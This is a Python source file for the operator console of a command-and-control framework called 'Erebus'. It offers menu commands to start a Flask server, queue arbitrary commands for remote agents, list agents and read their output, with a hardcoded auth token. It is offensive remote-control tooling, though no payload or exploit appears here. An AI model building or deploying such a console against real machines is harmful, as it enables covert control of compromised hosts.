import json

import server_controlling
import random
import shared
import server
import requests
print(""" 
command 
███████╗██████╗ ███████╗██████╗ ██╗   ██╗███████╗
██╔════╝██╔══██╗██╔════╝██╔══██╗██║   ██║██╔════╝
█████╗  ██████╔╝█████╗  ██████╔╝██║   ██║███████╗
██╔══╝  ██╔══██╗██╔══╝  ██╔══██╗██║   ██║╚════██║
███████╗██║  ██║███████╗██████╔╝╚██████╔╝███████║
╚══════╝╚═╝  ╚═╝╚══════╝╚═════╝  ╚═════╝ ╚══════╝
                    C 2  F R A M E W O R K \n

""")

while True:
    user_input = input("command>:")

    if user_input.lower() == "help":
        print(""" 
          
          start (Start FLask Server)
          stop (Stop Flask Server)
          command (Send Command to the Agent)
          sleep (Change Sleep of Agent)
          list (list active Agents)
          exit (Exit the program)
          """)
    elif user_input.lower() == "exit":
        break

    elif user_input.lower() == "start":
        server_controlling.start()

    elif user_input.lower() == "stop":
        server_controlling.stop()

    elif user_input.lower() == "command":
        command = input("Which cmd should be executed: ")
        shared.set_command(command)

    elif user_input.lower() == "command_output":
        agent_uuid = input("Enter Agent UUID: ")
        response = requests.get(
            url=f"http://127.0.0.1:5000/agent/{agent_uuid}/output"
        )
        print(response.text)

    elif user_input.lower() == "list":
        response = requests.get("http://127.0.0.1:5000/agent/list", headers={'X-Auth-ID': 'MyErebusToken'})

        data = json.loads( response.text)

        for key, value in data.items():
            print(f"{key}: {value}")
    else:
        print("Command not recognized")



